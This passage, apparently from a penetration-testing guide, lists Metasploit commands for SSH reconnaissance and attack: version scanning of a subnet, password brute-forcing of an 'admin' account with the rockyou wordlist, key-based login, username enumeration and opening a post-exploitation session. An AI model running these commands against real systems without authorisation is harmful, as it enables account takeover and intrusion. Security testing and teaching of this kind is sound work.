# Phase 10: Metasploit SSH Modules

Use Metasploit for comprehensive SSH testing:

```bash
# Start Metasploit
msfconsole

# SSH Version Scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SSH Login Brute-Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# SSH Key Login
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.100
set USERNAME admin
set KEY_FILE /path/to/id_rsa
run

# Username Enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE users.txt
run

# Post-exploitation with SSH session
sessions -i 1
```

## Quick Reference